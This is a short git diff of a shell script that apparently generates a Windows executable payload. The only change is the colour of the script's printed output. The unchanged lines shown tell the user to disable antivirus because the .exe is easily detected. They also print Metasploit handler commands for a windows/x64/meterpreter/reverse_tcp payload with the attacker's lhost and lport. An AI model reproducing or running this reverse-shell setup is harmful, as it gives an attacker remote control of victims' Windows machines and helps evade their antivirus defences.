@@ -15,7 +15,7 @@ but, the .exe file is very detectable, so don't forget to disable the antivurus 
     echo ""
     echo "Once you've finished and launched the .exe on a Windows computer, use those commands on metasploit :"
     echo ""
-    tput setaf 1
+    tput setaf 2
     echo "use exploit/multi/handler"
     echo ""
     echo "set payload windows/x64/meterpreter/reverse_tcp"
@@ -25,7 +25,7 @@ but, the .exe file is very detectable, so don't forget to disable the antivurus 
     echo ""
     echo "Use this commands :"
     echo ""
-    tput setaf 1
+    tput setaf 2
     echo "set lhost $lhost"
     echo ""
     echo "set lport $lport"
